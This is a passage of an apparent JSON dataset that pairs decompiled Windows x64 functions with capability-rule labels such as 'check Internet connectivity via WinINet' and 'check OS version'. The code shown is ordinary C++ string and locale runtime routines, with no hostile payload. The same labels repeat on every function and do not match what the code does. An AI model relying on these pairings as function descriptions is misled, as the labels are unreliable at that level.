fcn.14007d790(ppiVar5, 0x80);\n        puVar2 = **0x14010ff60;\n        uVar7 = *puVar2;\n        uVar8 = sub.msvcrt.dll_strlen(uVar7);\n        fcn.14007c480(ppiVar5, uVar7, uVar8);\n        piVar9 = *ppiVar5;\n        iVar13 = piVar9[-3];\n        uVar4 = iVar13 + 1;\n        if (piVar9[-2] < uVar4) {\ncode_r0x00014002c514:\n            fcn.14007d790(ppiVar5, uVar4);\n        }\n        else {\n            if (**0x14010fc90 == 0) {\n                iVar3 = *(piVar9 + -1);\n            }\n            else {\n                iVar3 = *(piVar9 + -1);\n            }\n            if (0 < iVar3) goto code_r0x00014002c514;\n        }\n        *(*ppiVar5 + (*ppiVar5)[-3]) = 0x3d;\n        piVar9 = *ppiVar5;\n        piVar9[-3] = uVar4;\n        *(piVar9 + -1) = 0;\n        *(piVar9 + iVar13 + 1) = 0;\n        uVar7 = **(*pcVar10 + 0x20);\n        uVar8 = sub.msvcrt.dll_strlen(uVar7);\n        fcn.14007c480(ppiVar5, uVar7, uVar8);\n        iVar13 = 8;\n        do {\n            piVar9 = *ppiVar5;\n            iVar11 = piVar9[-3];\n            uVar4 = iVar11 + 1;\n            if (piVar9[-2] < uVar4) {\ncode_r0x00014002c577:\n                fcn.14007d790(ppiVar5, uVar4);\ncode_r0x00014002c582:\n                piVar9 = *ppiVar5;\n                iVar11 = piVar9[-3];\n            }\n            else {\n                if (**0x14010fc90 != 0) {\n                    if (0 < *(piVar9 + -1)) goto code_r0x00014002c577;\n                    goto code_r0x00014002c582;\n                }\n                if (0 < *(piVar9 + -1)) goto code_r0x00014002c577;\n            }\n            *(piVar9 + iVar11) = 0x3b;\n            piVar9 = *ppiVar5;\n            piVar9[-3] = uVar4;\n            *(piVar9 + -1) = 0;\n            *(piVar9 + uVar4) = 0;\n            uVar7 = *(puVar2 + iVar13);\n            uVar8 = sub.msvcrt.dll_strlen(uVar7);\n            fcn.14007c480(ppiVar5, uVar7, uVar8);\n            piVar9 = *ppiVar5;\n            iVar11 = piVar9[-3];\n            uVar4 = iVar11 + 1;\n            if (piVar9[-2] < uVar4) {\ncode_r0x00014002c5e9:\n                fcn.14007d790(ppiVar5, uVar4);\n            }\n            else {\n                if (**0x14010fc90 == 0) {\n                    iVar3 = *(piVar9 + -1);\n                }\n                else {\n                    iVar3 = *(piVar9 + -1);\n                }\n                if (0 < iVar3) goto code_r0x00014002c5e9;\n            }\n            *(*ppiVar5 + (*ppiVar5)[-3]) = 0x3d;\n            piVar9 = *ppiVar5;\n            piVar9[-3] = uVar4;\n            *(piVar9 + -1) = 0;\n            *(piVar9 + iVar11 + 1) = 0;\n            uVar7 = *(*(*pcVar10 + 0x20) + iVar13);\n            uVar8 = sub.msvcrt.dll_strlen(uVar7);\n            fcn.14007c480(ppiVar5, uVar7, uVar8);\n            iVar13 = iVar13 + 8;\n            if (iVar13 == 0x30) {\n                return ppiVar5;\n            }\n        } while( true );\n    }\n    fcn.1400a91c0(arg1, uVar7, uVar4);\n    piVar9 = arg1[1];\n    ppiVar5 = *arg1;\n    if (ppiVar1 == ppiVar5) {\n        pcVar10 = 0xf;\n    }\n    else {\n        pcVar10 = arg1[2];\n    }\n    if (pcVar10 < piVar9 + 1) {\n        pcVar10 = piVar9;\n        fcn.1400a9390(arg1, piVar9, 0, 0);\n        ppiVar5 = *arg1;\n    }\n    *(ppiVar5 + piVar9) = 0x3d;\n    arg1[1] = piVar9 + 1;\n    *(*arg1 + 1 + piVar9) = 0;\n    uVar7 = *(*(*arg2 + 0x20) + iVar13);\n    uVar4 = sub.msvcrt.dll_strlen(uVar7);\n    if (0x3fffffffffffffffU - arg1[1] < uVar4) {\n        fcn.1400bd360(0x14010a72e);\n        goto code_r0x00014002c3ce;\n    }\n    fcn.1400a91c0(arg1, uVar7, uVar4);\n    iVar13 = iVar13 + 8;\n    if (iVar13 == 0x30) {\n        return arg1;\n    }\n    goto code_r0x00014002c2e8;\n}\n",
        "token_count": 2664
    },
    "14002dce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14002dce0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    if (**0x14010fc90 == 0) {\n        iVar2 = *(arg1 + 1);\n        *(arg1 + 1) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = arg1 + 1;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014002dd03. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 8))();\n    return;\n}\n",
        "token_count": 183
    },
    "14002f85": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14002f850(int64_t *arg1, uchar *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uint64_t arg4_00;\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    \n    arg4_00 = arg1[1];\n    if (arg4_00 < arg4) {\n        puVar1 = 0x14010baf8;\n        fcn.1400b7b60(0x14010baf8, 0x14010bc13, arg4, arg4_00);\n        return *puVar1;\n    }\n    uVar2 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar2 = arg3;\n    }\n    if (uVar2 != 0) {\n        if (uVar2 == 1) {\n            *arg2 = *(arg4 + *arg1);\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, arg4 + *arg1, uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 254
    },
    "1400305e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400305e0(int64_t *arg1, ushort *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    uint64_t arg4_00;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = arg1[1];\n    if (arg4_00 < arg4) {\n        puVar2 = 0x14010bf18;\n        fcn.1400b7b60(0x14010bf18, \"basic_string::copy\", arg4, arg4_00);\n        return *puVar2;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar1 = *arg1 + arg4 * 2;\n        if (uVar3 == 1) {\n            *arg2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar1, uVar3 * 2);\n    }\n    return uVar3;\n}\n",
        "token_count": 270
    },
    "14003323": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140033230(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, uint *noname_4, int64_t noname_5, \n             uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint64_t *puVar4;\n    char cVar5;\n    uint8_t uVar6;\n    char cVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t *puVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    uint8_t uVar15;\n    bool bVar16;\n    uint uVar17;\n    bool bVar18;\n    uint64_t uVar19;\n    int64_t *piVar20;\n    int64_t iVar21;\n    uint8_t uVar22;\n    uint64_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    ulong var_8h_2;\n    uint32_t *var_50h;\n    ulong auStack208 [5];\n    uint64_t auStack168 [2];\n    int64_t *piStack152;\n    uint64_t uStack144;\n    uint64_t *puStack136;\n    int64_t *piStack128;\n    int64_t *piStack120;\n    int64_t *piStack112;\n    uint8_t uStack101;\n    uint32_t uStack100;\n    uint64_t *var_58h;\n    uint64_t *var_50h_2;\n    int64_t *var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_1dh;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piStack152 = arg3[1];\n    piVar13 = *arg4;\n    var_50h_2 = *arg3;\n    piVar1 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    iVar14 = piStack152;\n    var_48h = var_48h & 0xffffffff00000000 | piStack152 & 0xffffffff;\n    auStack208[0] = 0x140033286;\n    piStack128 = piVar13;\n    piVar8 = fcn.1400b97f0(noname_7);\n    auStack208[0] = 0x140033295;\n    iVar9 = fcn.1400147b0(noname_7);\n    piVar20 = var_50h_2;\n    uVar10 = var_48h & 0xffffffff;\n    iVar9 = -iVar9;\n    bVar24 = iVar14 == -1;\n    bVar16 = var_50h_2 != NULL && bVar24;\n    bVar18 = bVar24;\n    if (bVar16) {\n        if (var_50h_2[2] < var_50h_2[3]) {\n            bVar18 = false;\n        }\n        else {\n            iVar21 = *var_50h_2;\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | var_48h & 0xffffffff;\n            var_48h = piVar20;\n            pcVar2 = *(iVar21 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x140033c0b;\n            iVar14 = (*pcVar2)(piVar20);\n            uVar10 = var_50h_2 & 0xffffffff;\n            piVar20 = var_48h;\n            if (iVar14 == -1) {\n                piVar20 = NULL;\n            }\n            bVar18 = iVar14 == -1 && bVar16;\n        }\n    }\n    bVar25 = piVar1 == -1;\n    uStack101 = bVar25;\n    bVar16 = piVar13 != NULL && bVar25;\n    if (bVar16) {\n        if (piVar13[2] < piVar13[3]) {\n            bVar25 = false;\n        }\n        else {\n            var_50h_2 = piVar20;\n            var_48h = var_48h & 0xffffffff00000000 | uVar10;\n            pcVar2 = *(*piVar13 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x140033bd5;\n            iVar14 = (*pcVar2)(piVar13);\n            uVar10 = var_48h & 0xffffffff;\n            piStack128 = NULL;\n            if (iVar14 != -1) {\n                piStack128 = piVar13;\n            }\n            bVar25 = iVar14 == -1 && bVar16;\n            piVar20 = var_50h_2;\n        }\n    }\n    var_48h._0_4_ = uVar10;\n    if (bVar25 != bVar18) {\n        if ((piVar20 == NULL) || (!bVar24)) {\n            cVar7 = uVar10;\n        }\n        else if (piVar20[2] < piVar20[3]) {\n            cVar7 = *piVar20[2];\n        }\n        else {\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar10;\n            var_48h = piVar20;\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x140033d0b;\n            iVar14 = (*pcVar2)(piVar20);\n            var_48h._0_4_ = var_50h_2;\n            cVar7 = iVar14;\n            piVar20 = var_48h;\n            if (iVar14 == -1) {\n                cVar7 = -1;\n                piVar20 = NULL;\n            }\n        }\n        var_50h_2 = piVar20;\n        var_48h = var_48h & 0xffffffff00000000 | var_48h;\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x140033348;\n        cVar5 = (*pcVar2)(piVar8, cVar7);\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x140033355;\n        uVar6 = (*pcVar2)(piVar8, cVar7);\n        piVar20 = var_50h_2;\n        if (noname_6 != 0) {\n            var_48h = var_48h & 0xffffffffffffff00 | uVar6;\n            var_58h = &stack0xffffffffffffff58 + iVar9 + noname_6 * 8;\n            uStack100 = var_48h;\n            piStack112 = var_50h_2;\n            var_50h_2 = &stack0xffffffffffffff58 + iVar9;\n            uVar10 = 0;\n            uVar19 = 0;\n            do {\n                while( true ) {\n                    uVar11 = uVar10;\n                    cVar7 = **(noname_5 + uVar11 * 8);\n                    pcVar2 = *(*piVar8 + 0x20);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x1400333be;\n                    cVar7 = (*pcVar2)(piVar8, cVar7);\n                    if (cVar5 != cVar7) break;\ncode_r0x0001400333c3:\n                    uVar3 = *(noname_5 + uVar11 * 8);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x1400333d4;\n                    uVar10 = sub.msvcrt.dll_strlen(uVar3);\n                    var_58h[uVar19] = uVar10;\n                    uVar23 = uVar19 + 1;\n                    var_50h_2[uVar19] = uVar11;\n                    uVar10 = uVar11 + 1;\n                    uVar19 = uVar23;\n                    if (noname_6 == uVar11 + 1) goto code_r0x0001400333f1;\n                }\n                pcVar2 = *(*piVar8 + 0x10);\n                *(&stack0xffffffffffffff30 + iVar9) = 0x1400333a0;\n                cVar7 = (*pcVar2)(piVar8);\n                if (var_48h == cVar7) goto code_r0x0001400333c3;\n                uVar10 = uVar11 + 1;\n            } while (noname_6 != uVar11 + 1);\ncode_r0x0001400333f1:\n            puVar4 = var_50h_2;\n            piVar20 = piStack112;\n            if (uVar19 < 2) {\n                uVar10 = 0;\n                var_48h._0_4_ = uStack100;\n            }\n            else {\n                uStack144 = uVar11 + 1;\n                var_48h = NULL;\n                uVar10 = *var_58h;\n                piStack112 = uVar19 * 8;\n                puStack136 = var_58h + 1;\ncode_r0x000140033440:\n                puVar12 = puStack136;\n                uVar11 = uVar10;\n                do {\n                    if (*puVar12 < uVar11) {\n                        uVar11 = *puVar12;\n                    }\n                    puVar12 = puVar12 + 1;\n                } while (var_58h + piStack112 != puVar12);\n                var_48h = var_48h + 1;\n                if (piVar20[2] < piVar20[3]) {\n                    piVar20[2] = piVar20[2] + 1;\n                }\n                else {\n                    pcVar2 = *(*piVar20 + 0x50);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x1400335c9;\n                    (*pcVar2)(piVar20);\n                }\n                if (var_48h == uVar11) {\n                    if (piVar20[2] < piVar20[3]) {\ncode_r0x0001400335e1:\n                        uStack100._0_1_ = 0;\n                    }\n                    else {\n                        pcVar2 = *(*piVar20 + 0x48);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x140033c30;\n                        iVar14 = (*pcVar2)(piVar20);\n                        if (iVar14 != -1) goto code_r0x0001400335e1;\n                        uStack100._0_1_ = 1;\n                        piVar20 = NULL;\n                    }\n                    piVar13 = piStack128;\n                    uVar6 = piStack128 != NULL & uStack101;\n                    var_50h_2._0_1_ = uStack101;\n                    if (uVar6 != 0) {\n                        if (piStack128[2] < piStack128[3]) {\n                            var_50h_2._0_1_ = 0;\n                        }\n                        else {\n                            uStack100 = uStack100 & 0xffffff00 | uStack100;\n                            var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n                            pcVar2 = *(*piStack128 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x140033b9e;\n                            iVar14 = (*pcVar2)(piVar13);\n                            piStack128 = NULL;\n                            if (iVar14 != -1) {\n                                piStack128 = piVar13;\n                            }\n                            if (iVar14 != -1) {\n                                var_50h_2._0_1_ = 0;\n                            }\n                        }\n                    }\n                    bVar16 = false;\n                    if (var_50h_2 == uStack100) goto code_r0x0001400336be;\n                    if (piVar20 == NULL) {\ncode_r0x0001400339f0:\n                        piVar20 = NULL;\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x140033a00;\n                        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n                        uStack100 = uStack100 & 0xffffff00 | uVar6;\n                    }\n                    else {\n                        if (piVar20[3] <= piVar20[2]) {\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x1400339e7;\n                            iVar14 = (*pcVar2)(piVar20);\n                            if (iVar14 == -1) goto code_r0x0001400339f0;\n                        }\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14003362b;\n                        uVar6 = (*pcVar2)(piVar8);\n                        uStack100 = uStack100 & 0xffffff00 | uVar6;\n                        if (piVar20[3] <= piVar20[2]) {\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x140033b71;\n                            iVar14 = (*pcVar2)(piVar20);\n                            if (iVar14 == -1) {\n                                piVar20 = NULL;\n                            }\n                        }\n                    }\n                    uVar23 = 0;\n                    pcVar2 = *(*piVar8 + 0x10);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14003364a;\n                    uVar6 = (*pcVar2)(piVar8);\n                    uVar11 = var_48h;\n                    piStack120 = piVar20;\n                    var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n                    auStack168[1] = uVar10;\n                    do {\n                        if (uVar11 < var_58h[uVar23]) {\n                            pcVar2 = *(*piVar8 + 0x20);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14003368a;\n                            cVar7 = (*pcVar2)(piVar8);\n                            if (cVar7 != uStack100) {\n                                pcVar2 = *(*piVar8 + 0x10);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14003369f;\n                                cVar7 = (*pcVar2)(piVar8);\n                                if (var_50h_2 != cVar7) goto code_r0x0001400336a8;\n                            }\n                            bVar16 = true;\n                            piVar20 = piStack120;\n                            uVar10 = auStack168[1];\n                            goto code_r0x0001400336be;\n                        }\ncode_r0x0001400336a8:\n                        uVar23 = uVar23 + 1;\n                    } while (uVar23 != uVar19);\n                    bVar16 = false;\n                    piVar20 = piStack120;\n                    uVar10 = auStack168[1];\ncode_r0x0001400336be:\n                    uVar11 = 0;\n                    do {\n                        if ((var_48h == uVar10) == bVar16) {\n                            uVar19 = uVar19 - 1;\n                            piStack112 = uVar19 * 8;\n                            puVar4[uVar11] = puVar4[uVar19];\n                            var_58h[uVar11] = var_58h[uVar19];\n                            if (uVar19 <= uVar11) goto code_r0x000140033708;\n                        }\n                        else {\n                            uVar11 = uVar11 + 1;\n                            if (uVar19 <= uVar11) goto code_r0x000140033708;\n                        }\n                        uVar10 = var_58h[uVar11];\n                    } while( true );\n                }\n                if (var_48h < uVar11) goto code_r0x000140033499;\ncode_r0x000140033786:\n                var_48h._0_4_ = 0xffffffff;\n                uVar10 = var_48h;\n            }\n            if (uVar19 == 1) {\n                if (piVar20[2] < piVar20[3]) {\n                    piVar20[2] = piVar20[2] + 1;\n                    var_48h = piVar20;\n                }\n                else {\n                    var_48h = piVar20;\n                    pcVar2 = *(*piVar20 + 0x50);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x140033ab9;\n                    (*pcVar2)(piVar20);\n                }\n                uVar19 = *puVar4;\n                uVar10 = uVar10 + 1;\n                iVar21 = *(noname_5 + uVar19 * 8);\n                uVar11 = *var_58h;\n                piVar20 = var_48h;\n                if (uVar10 < uVar11) {\ncode_r0x000140033860:\n                    do {\n                        if (piVar20[2] < piVar20[3]) {\ncode_r0x00014003386e:\n                            uVar6 = 0;\n                        }\n                        else {\n                            var_48h = piVar20;\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x140033acf;\n                            iVar14 = (*pcVar2)(piVar20);\n                            piVar20 = var_48h;\n                            if (iVar14 != -1) goto code_r0x00014003386e;\n                            uVar6 = 1;\n                            piVar20 = NULL;\n                        }\ncode_r0x000140033871:\n                        piVar13 = piStack128;\n                        uVar17 = uVar19;\n                        uVar15 = piStack128 != NULL & uStack101;\n                        uVar22 = uStack101;\n                        if (uVar15 != 0) {\n                            if (piStack128[2] < piStack128[3]) {\n                                uVar22 = 0;\n                            }\n                            else {\n                                var_48h = piVar20;\n                                pcVar2 = *(*piStack128 + 0x48);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x140033b22;\n                                iVar14 = (*pcVar2)(piVar13);\n                                piVar13 = NULL;\n                                if (iVar14 != -1) {\n                                    piVar13 = piStack128;\n                                }\n                                piStack128 = piVar13;\n                                piVar20 = var_48h;\n                                uVar22 = uVar15;\n                                if (iVar14 != -1) {\n                                    uVar22 = 0;\n                                }\n                            }\n                        }\n                        if (uVar6 == uVar22) goto code_r0x0001400337d9;\n                        cVar7 = *(iVar21 + uVar10);\n                        var_48h = piVar20;\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x1400338a1;\n                        cVar7 = (*pcVar2)(piVar8, cVar7);\n                        piVar13 = var_48h;\n                        if (var_48h == NULL) {\ncode_r0x0001400338b0:\n                            pcVar2 = *(*piVar8 + 0x20);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x1400338be;\n                            cVar5 = (*pcVar2)(piVar8);\n                            if (cVar7 != cVar5) {\n                                cVar7 = *(iVar21 + uVar10);\n                                pcVar2 = *(*piVar8 + 0x10);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14003381e;\n                                cVar7 = (*pcVar2)(piVar8, cVar7);\n                                var_48h = NULL;\n                                goto code_r0x000140033828;\n                            }\n                            uVar23 = *0x10;\n                            piVar20 = NULL;\n                            piVar13 = NULL;\n                            if (*0x10 < *0x18) goto code_r0x00014003384b;\ncode_r0x0001400338d7:\n                            var_48h = piVar13;\n                            pcVar2 = *(*piVar13 + 0x50);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x1400338e8;\n                            (*pcVar2)(piVar13);\n                            uVar10 = uVar10 + 1;\n                            piVar20 = var_48h;\n                            if (uVar10 + 1 == uVar11) break;\n                            goto code_r0x000140033860;\n                        }\n                        if (var_48h[3] <= var_48h[2]) {\n                            pcVar2 = *(*var_48h + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x140033afd;\n                            iVar14 = (*pcVar2)(piVar13);\n                            if (iVar14 == -1) goto code_r0x0001400338b0;\n                        }\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14003398f;\n                        cVar5 = (*pcVar2)(piVar8);\n                        if (cVar7 != cVar5) {\n                            pcVar2 = *(*piVar8 + 0x10);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x1400339ad;\n                            cVar7 = (*pcVar2)(piVar8);\n                            piVar13 = var_48h;\n                            if (var_48h[3] <= var_48h[2]) {\n                                pcVar2 = *(*var_48h + 0x48);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x140033b51;\n                                iVar14 = (*pcVar2)(piVar13);\n                                if (iVar14 == -1) {\n                                    var_48h = NULL;\n                                }\n                            }\ncode_r0x000140033828:\n                            pcVar2 = *(*piVar8 + 0x10);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x140033835;\n                            cVar5 = (*pcVar2)(piVar8);\n                            piVar20 = var_48h;\n                            if (cVar5 != cVar7) goto code_r0x0001400337d9;\n                        }\n                        uVar23 = var_48h[2];\n                        piVar20 = var_48h;\n                        piVar13 = var_48h;\n                        if (var_48h[3] <= uVar23) goto code_r0x0001400338d7;\ncode_r0x00014003384b:\n                        piVar20[2] = uVar23 + 1;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 + 1 != uVar11);\n                }\n                else {\ncode_r0x0001400337d9:\n                    uVar17 = uVar19;\n                    if (uVar10 != uVar11) {\ncode_r0x0001400337e2:\n                        var_48h._0_4_ = 0xffffffff;\n                        goto code_r0x0001400332e3;\n                    }\n                }\n                var_48h._0_4_ = 0xffffffff;\n                *noname_4 = uVar17;\n                goto code_r0x0001400332ed;\n            }\n        }\n    }\ncode_r0x0001400332e3:\n    *var_50h = *var_50h | 4;\ncode_r0x0001400332ed:\n    arg1[1] = piStack152 & 0xffffffff00000000 | var_48h;\n    *arg1 = piVar20;\n    return arg1;\ncode_r0x000140033708:\n    if (bVar16 == false) {\n        if (uVar19 == 2) {\n            if ((uStack144 & 1) != 0) goto code_r0x0001400337e2;\n            uVar19 = *puVar4;\n            uVar10 = uStack144 >> 1;\n            if (uVar19 < uVar10) {\n                if (uVar10 + uVar19 != puVar4[1]) goto code_r0x0001400337e2;\n                goto code_r0x000140033c8e;\n            }\n            var_48h._0_4_ = 0xffffffff;\n            if (uVar19 - uVar10 != puVar4[1]) goto code_r0x0001400332e3;\n            *puVar4 = uVar19 - uVar10;\n            *var_58h = var_58h[1];\n        }\n        else if (uVar19 != 1) goto code_r0x0001400337e2;\n        uVar19 = *puVar4;\ncode_r0x000140033c8e:\n        iVar21 = *(noname_5 + uVar19 * 8);\n        uVar11 = *var_58h;\n        uVar10 = var_48h;\n        if (uVar11 <= var_48h) goto code_r0x0001400337d9;\n        if (piVar20 == NULL) {\n            uVar6 = 1;\n            goto code_r0x000140033871;\n        }\n        goto code_r0x000140033860;\n    }\n    uVar10 = *var_58h;\n    if (1 < uVar19) {\n        puVar12 = puStack136;\n        do {\n            if (*puVar12 < uVar10) {\n                uVar10 = *puVar12;\n            }\n            puVar12 = puVar12 + 1;\n        } while (var_58h + piStack112 != puVar12);\n    }\n    if (uVar10 <= var_48h) goto code_r0x000140033786;\n    if (piVar20 == NULL) {\n        uVar22 = piStack128 != NULL & uStack101;\n        uVar6 = uStack101;\n        if (uVar22 != 0) goto code_r0x000140033768;\ncode_r0x0001400334c1:\n        if (bVar16 == uVar6) goto code_r0x000140033786;\n    }\n    else {\ncode_r0x000140033499:\n        if (piVar20[2] < piVar20[3]) {\ncode_r0x0001400334a7:\n            bVar16 = false;\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x1400337f6;\n            iVar14 = (*pcVar2)(piVar20);\n            if (iVar14 != -1) goto code_r0x0001400334a7;\n            bVar16 = true;\n            piVar20 = NULL;\n        }\n        uVar22 = piStack128 != NULL & uStack101;\n        uVar6 = uStack101;\n        if (uVar22 == 0) goto code_r0x0001400334c1;\ncode_r0x000140033768:\n        uVar6 = uVar22;\n        piVar13 = piStack128;\n        if (piStack128[3] <= piStack128[2]) {\n            pcVar2 = *(*piStack128 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x140033a35;\n            iVar14 = (*pcVar2)(piVar13);\n            piStack128 = NULL;\n            if (iVar14 != -1) {\n                piStack128 = piVar13;\n            }\n            if (iVar14 != -1) {\n                uVar6 = 0;\n            }\n            goto code_r0x0001400334c1;\n        }\n        if (bVar16 == false) goto code_r0x000140033786;\n    }\n    if (piVar20 == NULL) {\ncode_r0x000140033920:\n        piVar20 = NULL;\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x140033930;\n        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n        var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x140033941;\n        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n    }\n    else {\n        if (piVar20[2] < piVar20[3]) {\n            cVar7 = *piVar20[2];\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14003390f;\n            iVar14 = (*pcVar2)(piVar20);\n            cVar7 = iVar14;\n            if (iVar14 == -1) goto code_r0x000140033920;\n        }\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x1400334f0;\n        uVar6 = (*pcVar2)(piVar8, cVar7);\n        var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n        if (piVar20[2] < piVar20[3]) {\n            iVar14 = *piVar20[2];\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x140033a16;\n            iVar14 = (*pcVar2)(piVar20);\n            if (iVar14 == -1) {\n                piVar20 = NULL;\n            }\n            else {\n                iVar14 = iVar14;\n            }\n        }\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14003350d;\n        uVar6 = (*pcVar2)(piVar8, iVar14);\n    }\n    if (uVar19 == 0) {\n        var_48h._0_4_ = 0xffffffff;\n        goto code_r0x0001400332e3;\n    }\n    piStack120 = piVar20;\n    uVar10 = 0;\n    uStack100 = uStack100 & 0xffffff00 | uVar6;\n    do {\n        while( true ) {\n            cVar7 = *(var_48h + *(noname_5 + puVar4[uVar10] * 8));\n            pcVar2 = *(*piVar8 + 0x20);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14003358c;\n            cVar7 = (*pcVar2)(piVar8, cVar7);\n            if (cVar7 != var_50h_2) break;\ncode_r0x000140033591:\n            uVar10 = uVar10 + 1;\n            if (uVar19 <= uVar10) goto code_r0x00014003359a;\n        }\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x140033536;\n        cVar7 = (*pcVar2)(piVar8);\n        if (uStack100 == cVar7) goto code_r0x000140033591;\n        uVar19 = uVar19 - 1;\n        piStack112 = uVar19 * 8;\n        puVar4[uVar10] = puVar4[uVar19];\n        var_58h[uVar10] = var_58h[uVar19];\n 